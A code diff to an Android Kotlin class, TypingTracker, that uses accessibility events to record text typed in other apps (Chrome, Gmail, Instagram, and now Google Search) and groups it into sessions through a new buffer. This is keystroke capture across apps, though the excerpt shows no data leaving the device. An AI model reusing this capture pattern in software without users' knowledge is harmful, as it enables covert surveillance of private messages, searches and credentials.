@@ -3,7 +3,7 @@ package com.phonehand.app
 import android.content.Context
 import android.view.accessibility.AccessibilityEvent
 
-/** Log typed text snippets per app into ActivityStore and NotesStore. */
+/** Log typed text — grouped into sessions with app/search context. */
 object TypingTracker {
     private const val CHUNK_SIZE = 200
 
@@ -15,6 +15,7 @@ object TypingTracker {
         "com.android.chrome" to "Chrome",
         "com.google.android.gm" to "Gmail",
         "com.instagram.android" to "Instagram",
+        "com.google.android.googlequicksearchbox" to "Google Search",
     )
 
     private val lastTextByField = mutableMapOf<String, String>()
@@ -35,20 +36,7 @@ object TypingTracker {
         if (trimmed.isEmpty()) return
 
         val app = labelFor(pkg)
-        val chunks = splitChunks(trimmed, CHUNK_SIZE)
-        for (chunk in chunks) {
-            if (chunk.isBlank()) continue
-            val snippet = chunk.trim().take(80)
-            ActivityStore.add(
-                context,
-                type = "typing",
-                app = app,
-                who = "",
-                preview = snippet,
-            )
-            NotesStore.append(context, chunk, "keyboard", pkg)
-        }
-        NotesStore.flush(context)
+        TypingSessionBuffer.onTyping(context, pkg, app, fieldKey, trimmed)
     }
 
     private fun fieldKey(event: AccessibilityEvent, pkg: String): String {
@@ -92,18 +80,6 @@ object TypingTracker {
                 return null
             }
         }
-    }
-
-    private fun splitChunks(text: String, maxLen: Int): List<String> {
-        if (text.length <= maxLen) return listOf(text)
-        val out = mutableListOf<String>()
-        var i = 0
-        while (i < text.length) {
-            val end = (i + maxLen).coerceAtMost(text.length)
-            out.add(text.substring(i, end))
-            i = end
-        }
-        return out
     }
 
     private fun labelFor(pkg: String): String {
